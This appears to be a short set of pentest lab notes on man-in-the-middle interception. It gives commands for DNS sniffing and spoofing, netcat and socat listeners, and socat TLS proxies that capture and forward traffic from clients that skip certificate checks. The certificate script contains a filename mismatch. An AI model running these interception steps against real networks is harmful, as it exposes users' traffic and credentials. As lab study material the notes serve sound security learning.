# Intercept

Click here for [CVE-2011-0228](CVE-2011-0228.md)  notes.

Click here for [CVE-2014-1266](CVE-2014-1266.md) notes.

### Setup

* To dump all the request the user is trying to access:

  ```bash
  tcpdump -i eth0 udp port 53
  ```

* To create your own dns server:

  ```bash
  dnsmasq -C dnsmasq.conf --no-daemon
  ```

  file dnsmasq.conf:

  ```
  addn-hosts=dnsmasq.hosts
  ```

  file dnsmasq.hosts:

  ```
  public-ip	dns-url
  ```

### Simple TCP Server

* Know that we got the client to connect to us, we just need to setup a TCP server. This can easily be done using:
  - `netcat` with `sudo nc -l -p 80` 

### TCP server with TLS support(if client doesn't verify it)

* To create a simple TCP server with TLS support we need to create a certificate. This can easily be done using OpenSSL.

  We can make a script named `create_cert.sh`

  ```bash
  FILENAME=server
  # Generate a self signed certificate:
  openssl req -new -x509 -keyout test.key -out test.crt -nodes
  # Generate the PEM file by just appending the key and certificate files:
  cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
  ```
  
* run your own server with TLS support using `socat`:

  ```bash
  $ sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=server.pem,cafile=server.crt,verify=0 -
  ```

  If you get the request from the client, it shows that the client does not perform any kind of certificate validation. 

* The command above will give us the content of the request, but you  often want to just listen to the request and forward it to the  legitimate server. This can be done using the following command:

  ```bash
  $ sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
  ```

### TCP server with TLS support (if client verify that certificate is issued by valid hostname not self-signed as previous one)

* for this exercise, you can access a valid certificate and its private key [here](https://pentesterlab.com/exercises/mitm_III/attachments).

  ```bash
  $ sudo socat openssl-listen:443,reuseaddr,fork,cert=hackingwithpentesterlab.link.crt,cafile=GandiStandardSSLCA2.pem,key=hackingwithpentesterlab.link.key,verify=0 -
  ```

  



